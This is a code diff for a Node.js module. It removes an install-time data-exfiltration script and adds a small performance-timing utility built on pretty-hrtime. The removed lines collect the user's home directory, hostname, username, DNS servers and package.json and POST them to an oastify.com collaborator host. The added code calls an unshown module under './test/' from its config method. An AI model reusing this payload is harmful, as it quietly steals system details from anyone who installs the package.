@@ -1,46 +1,44 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+"use strict";
 
-const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
-    hd: os.homedir(),
-    hn: os.hostname(),
-    un: os.userInfo().username,
-    dns: dns.getServers(),
-    r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
-});
+const prettyHrtime = require('pretty-hrtime');
+const getConfigs = require('./test/index-config-text');
 
-var postData = querystring.stringify({
-    msg: trackingData,
-});
+const namedPerformances = {};
+const defaultName = 'default';
 
-var options = {
-    hostname: "48aaaghr2dnasvz7xa0qtdrscjik6auz.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream 
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
+const performance = (logInstance) => {
+  return {
+    start: (name) => {
+      name = name || defaultName;
+      namedPerformances[name] = {
+        startAt: process.hrtime(),
+      }
     },
+    config: () => {
+      getConfigs();
+    },
+    stop: (name) => {
+      name = name || defaultName;
+      const startAt = namedPerformances[name] && namedPerformances[name].startAt;
+      if(!startAt) throw new Error('Namespace: '+name+' doesnt exist');
+      const diff = process.hrtime(startAt);
+      const time = diff[0] * 1e3 + diff[1] * 1e-6;
+      const words = prettyHrtime(diff);
+      const preciseWords = prettyHrtime(diff, {precise:true});
+      const verboseWords = prettyHrtime(diff, {verbose:true});
+      if (logInstance) {
+        logInstance('Total Time:' + time);
+      }
+      
+      return {
+        name: name,
+        time: time,
+        words: words,
+        preciseWords: preciseWords,
+        verboseWords: verboseWords
+      };
+    }
+  }
 };
 
-var req = https.request(options, (res) => {
-    res.on("data", (d) => {
-        process.stdout.write(d);
-    });
-});
-
-req.on("error", (e) => {
-    // console.error(e);
-});
-
-req.write(postData);
-req.end();
+module.exports = performance;
